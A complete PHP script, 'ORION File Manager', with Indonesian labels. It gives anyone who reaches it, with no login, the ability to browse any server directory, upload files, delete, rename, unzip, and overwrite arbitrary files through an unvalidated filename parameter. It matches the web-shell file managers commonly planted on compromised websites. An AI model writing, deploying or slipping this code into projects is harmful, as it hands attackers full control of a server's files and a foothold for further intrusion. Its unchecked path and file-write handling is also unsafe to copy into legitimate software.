<?php
$activeDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$activeDir = realpath($activeDir);

// Handle file/folder removal
if (!empty($_GET['remove'])) {
    $target = realpath($activeDir . '/' . basename($_GET['remove']));
    if ($target && is_file($target)) {
        unlink($target);
        echo "File '" . basename($target) . "' dihapus.<br>";
    } elseif ($target && is_dir($target)) {
        rmdir($target);
        echo "Folder '" . basename($target) . "' dihapus.<br>";
    }
}

// Handle folder creation
if (!empty($_POST['create_dir'])) {
    $newDir = $activeDir . '/' . basename($_POST['create_dir']);
    if (!is_dir($newDir)) {
        mkdir($newDir);
    }
}

// Handle file upload
if (!empty($_FILES['upload_file'])) {
    $fileName = basename($_FILES['upload_file']['name']);
    $targetPath = $activeDir . '/' . $fileName;
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath);
}

// Handle file editing
if (!empty($_POST['file_content']) && !empty($_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['file_content']);
    echo "<div class='notice'>File disimpan.</div>";
}

// Handle unzip
if (!empty($_POST['unzip_file'])) {
    $zipPath = realpath($activeDir . '/' . basename($_POST['unzip_file']));
    if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($zipPath) === TRUE) {
            $zip->extractTo($activeDir);
            $zip->close();
            echo "<div class='notice'>File '" . basename($zipPath) . "' berhasil di-unzip.</div>";
        } else {
            echo "<div class='notice'>Gagal membuka file zip.</div>";
        }
    } else {
        echo "<div class='notice'>File zip tidak ditemukan atau bukan file zip.</div>";
    }
}

// Handle rename
if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
    $oldPath = realpath($activeDir . '/' . basename($_POST['rename_old']));
    $newPath = $activeDir . '/' . basename($_POST['rename_new']);
    if ($oldPath && file_exists($oldPath)) {
        if (!file_exists($newPath)) {
            if (rename($oldPath, $newPath)) {
                echo "<div class='notice'>Berhasil rename '" . basename($oldPath) . "' menjadi '" . basename($newPath) . "'</div>";
            } else {
                echo "<div class='notice'>Gagal melakukan rename.</div>";
            }
        } else {
            echo "<div class='notice'>Nama baru sudah ada.</div>";
        }
    } else {
        echo "<div class='notice'>File atau folder yang ingin di-rename tidak ditemukan.</div>";
    }
}

// Fungsi untuk format ukuran file agar mudah dibaca
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>ORION File Manager</title>
    <style>
        body { font-family: Consolas, monospace; background: #111; color: #eee; padding: 20px; }
        a { color: #3cf; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1000px; margin: auto; }
        h2 { color: #6cf; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #444; }
        th { background: #222; }
        td { vertical-align: middle; }
        form { margin-top: 15px; }
        input[type="text"], input[type="file"], textarea {
            width: 100%; padding: 8px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px;
        }
        input[type="submit"] {
            background: #3cf; color: #000; border: none; padding: 8px 16px; margin-top: 5px;
            cursor: pointer; border-radius: 4px;
        }
        input[type="submit"]:hover { background: #5df; }
        .file-edit { margin-top: 30px; background: #1a1a1a; padding: 20px; border-radius: 8px; }
        .notice { background: #0f0; color: #000; padding: 5px; margin-top: 10px; border-radius: 4px; }
        .rename-form { margin-top: 30px; background: #1a1a1a; padding: 15px; border-radius: 8px; }
        label { display: block; margin-top: 10px; }
        .actions a { margin-right: 10px; color: #f66; }
        .actions a.edit { color: #6cf; }
    </style>
</head>
<body>
<div class="container">
    <h2>📁 Direktori Aktif: <?php echo htmlspecialchars($activeDir); ?></h2>

    <table>
        <thead>
            <tr>
                <th>Nama File/Folder</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Writable</th>
                <th>Aksi</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $parent = dirname($activeDir);
        if ($parent !== $activeDir) {
            echo "<tr><td><a href='?dir=" . urlencode($parent) . "'>[.. Naik Folder]</a></td><td>-</td><td>-</td><td>-</td><td></td></tr>";
        }

        foreach (scandir($activeDir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $activeDir . '/' . $item;
            $size = '-';
            $lastMod = date("Y-m-d H:i:s", filemtime($fullPath));
            $writable = is_writable($fullPath) ? 'Yes' : 'No';

            if (is_dir($fullPath)) {
                $size = '-';
                echo "<tr>
                        <td>📁 <a href='?dir=" . urlencode(realpath($fullPath)) . "'>$item</a></td>
                        <td>$size</td>
                        <td>$lastMod</td>
                        <td>$writable</td>
                        <td class='actions'>
                            <a href='?dir=" . urlencode($activeDir) . "&remove=" . urlencode($item) . "' onclick='return confirm(\"Yakin ingin hapus folder $item?\")'>hapus</a>
                        </td>
                    </tr>";
            } else {
                $size = formatSize(filesize($fullPath));
                echo "<tr>
                        <td>📄 $item</td>
                        <td>$size</td>
                        <td>$lastMod</td>
                        <td>$writable</td>
                        <td class='actions'>
                            <a href='?dir=" . urlencode($activeDir) . "&remove=" . urlencode($item) . "' onclick='return confirm(\"Yakin ingin hapus file $item?\")'>hapus</a>
                            <a class='edit' href='?dir=" . urlencode($activeDir) . "&edit=" . urlencode($item) . "'>edit</a>
                        </td>
                    </tr>";
            }
        }
        ?>
        </tbody>
    </table>

    <h3>📤 Upload File</h3>
    <form method="post" enctype="multipart/form-data" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="file" name="upload_file" required>
        <input type="submit" value="Upload">
    </form>

    <h3>📂 Buat Folder Baru</h3>
    <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="text" name="create_dir" placeholder="Nama folder" required>
        <input type="submit" value="Buat">
    </form>

    <h3>🗜️ Unzip File ZIP</h3>
    <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
        <input type="text" name="unzip_file" placeholder="Nama file .zip" required>
        <input type="submit" value="Unzip">
    </form>

    <h3>✏️ Rename File/Folder</h3>
    <form method="post" class="rename-form" action="?dir=<?php echo urlencode($activeDir); ?>">
        <label for="rename_old">Nama Lama (file/folder):</label>
        <input type="text" id="rename_old" name="rename_old" placeholder="Nama file/folder lama" required>
        <label for="rename_new">Nama Baru:</label>
        <input type="text" id="rename_new" name="rename_new" placeholder="Nama baru" required>
        <input type="submit" value="Rename">
    </form>

    <?php
    if (!empty($_GET['edit'])):
        $editFile = $activeDir . '/' . basename($_GET['edit']);
        if (is_file($editFile)):
            $content = htmlspecialchars(file_get_contents($editFile));
    ?>
        <div class="file-edit">
            <h3>✏️ Edit File: <?php echo basename($editFile); ?></h3>
            <form method="post" action="?dir=<?php echo urlencode($activeDir); ?>">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                <textarea name="file_content" rows="20"><?php echo $content; ?></textarea>
                <input type="submit" value="💾 Simpan">
            </form>
        </div>
    <?php
        endif;
    endif;
    ?>
</div>
</body>
</html>
